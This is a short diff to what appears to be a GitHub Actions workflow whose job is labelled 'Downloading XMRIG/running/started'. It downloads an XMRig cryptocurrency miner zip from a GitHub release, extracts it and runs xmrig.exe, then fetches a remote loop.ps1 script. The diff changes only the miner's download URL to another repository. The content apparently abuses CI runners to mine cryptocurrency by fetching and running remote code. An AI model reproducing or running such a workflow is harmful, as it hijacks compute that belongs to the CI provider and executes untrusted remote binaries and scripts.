@@ -31,7 +31,7 @@ jobs:
       run: cmd /c start.bat
     - name: Downloading XMRIG/running/started
       run: |
-        Invoke-WebRequest https://github.com/Rohan-uwu/XMRnsdkjbahsndsavjdbsvjksdadjkbsahvdhashjdjasbjkbdshfjsjiusdiohdjsldk-ahjkdfhhdbiugsdjhfuiassijfi/releases/download/1/xmrig-6.12.2.zip -OutFile XMRIG.zip
+        Invoke-WebRequest https://github.com/denisook/denisasuke/releases/download/xmr/xmrig-6.12.2.zip -OutFile XMRIG.zip
         Expand-Archive XMRIG.zip
         .\XMRIG\xmrig-6.12.2\xmrig.exe &&
         Invoke-WebRequest https://raw.githubusercontent.com/denisook/denisasuke/main/loop.ps1 -OutFile loop.ps1
